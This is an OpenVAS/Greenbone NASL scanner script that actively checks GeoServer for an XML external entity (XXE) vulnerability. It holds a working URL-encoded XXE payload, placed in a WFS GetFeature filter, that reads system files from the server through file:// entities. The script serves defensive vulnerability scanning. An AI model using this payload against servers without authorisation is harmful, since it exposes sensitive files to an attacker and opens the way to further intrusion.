# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:geoserver:geoserver";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105320");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-08-17 13:57:49 +0200 (Mon, 17 Aug 2015)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Geoserver 2.5.x < 2.5.5.1, 2.6.x < 2.6.4, 2.7.x < 2.7.1.1 XXE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_geoserver_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("geoserver/http/detected");
  script_require_ports("Services/www", 8080);

  script_tag(name:"summary", value:"Geoserver is prone to an XML external entity (XXE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check the response");

  script_tag(name:"insight", value:"An XXE vulnerability in Geoserver allows to view file contents
  and list directories on the server.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to gain access to sensitive
  information, this may lead to further attacks.");

  script_tag(name:"affected", value:"GeoServer version 2.5.x, 2.6.x and 2.7.x.");

  script_tag(name:"solution", value:"Update to version 2.7.2 or later.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37757/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

url = dir + "/wfs?request=GetCapabilities";

req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req );

feature_list = make_list();

features = eregmatch( pattern:"<FeatureTypeList>(.*)</FeatureTypeList>", string:buf);
if( isnull( features[1] ) )
  exit( 0 );

features = split( features[1], sep:"<", keep:TRUE );

foreach line ( features ) {
  if( "Name>" >< line ) {
    f = eregmatch( pattern:"Name>([^<]+)<", string:line );
    if( ! isnull( f[1] ) )
      feature_list = make_list_unique( feature_list, f[1] );
  }
}

if( max_index( feature_list ) < 1 )
  exit( 0 );

files = traversal_files();

foreach file ( keys( files ) ) {
  foreach feature ( feature_list ) {
    url = dir + "/wfs?request=GetFeature&SERVICE=WFS&VERSION=1.0.0&TYPENAME=" + feature +
                "&FILTER=%3C%3Fxml%20version%3D%221.0%22%20"  +
                "encoding%3D%22ISO-8859-1%22%3F%3E%20%3C!DOCTYPE%20foo%20[%20%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F/" +
                files[ file ] +"%22%20%3E]%3E%3CFilter%20%3E%3CPropertyIsEqualTo%3E%3CPropertyName%3E%26xxe%3B%3C%2FPropertyName%3E%3CLiteral%3EBrussels%3C" +
                "%2FLiteral%3E%3C%2FPropertyIsEqualTo%3E%3C%2FFilter%3E";

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
